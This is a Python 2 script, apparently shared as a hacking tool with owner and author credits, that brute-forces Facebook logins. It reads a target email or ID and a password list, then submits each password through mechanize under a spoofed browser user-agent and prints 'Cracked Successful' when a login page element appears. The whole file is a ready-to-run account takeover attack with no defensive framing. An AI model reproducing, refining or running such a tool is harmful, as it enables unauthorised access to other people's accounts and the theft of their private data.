#coding=utf-8
import time, mechanize
import os

logo=""" _____  _____  _____  _____  ___    _   _ 
(  _  )(_   _)(_   _)(  _  )(  _`\ ( ) ( )
| (_) |  | |    | |  | (_) || ( (_)| |/'/'
|  _  |  | |    | |  |  _  || |  _ | , <  
| | | |  | |    | |  | | | || (_( )| |\`\ 
(_) (_)  (_)    (_)  (_) (_)(____/'(_) (_)"""
logo1="""=========================================="""
logo2=('         Owner:-    Badhßhah')
logo3=('         Author:-   Sachin Shrivastv')
logo4=('         Whatsapp:- +977-9845844301')
os.system('clear')

time.sleep(0.5)
print(logo)
print(logo1)
print(logo2)
print(logo3)
print(logo4)
print(logo1)
user = raw_input('[@] ID/Email:- ')
wrdlstFileName = raw_input('[#] Passlist:- ')
print(logo1)
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('[!] File Not Found!')
    exit()

time.sleep(1)
print ''
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[√]Correct Password:- '+password 
                print('Cracked Successful')
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Incorrect Password:- "+password
        except KeyboardInterrupt:
            print 'Error....'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print(logo1)
print 'Sorry, Correct Password Not Found.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
raw_input('Attacking End....')
os.system('python2 Main.py')